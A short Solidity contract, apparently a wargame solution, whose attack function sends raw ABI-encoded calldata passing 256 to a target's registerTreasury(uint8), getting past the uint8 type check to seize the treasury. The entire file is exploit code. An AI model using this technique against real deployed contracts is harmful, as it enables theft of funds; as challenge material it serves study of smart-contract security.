// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract HigherOrderAttack {
    function attack(address _targetAddress) public {
        uint256 treasury = 256;
        bool _success;

        bytes memory _registerData = abi.encodeWithSignature(
            "registerTreasury(uint8)",
            treasury
        );

        (_success, ) = _targetAddress.call(_registerData);
        require(_success);
    }
}
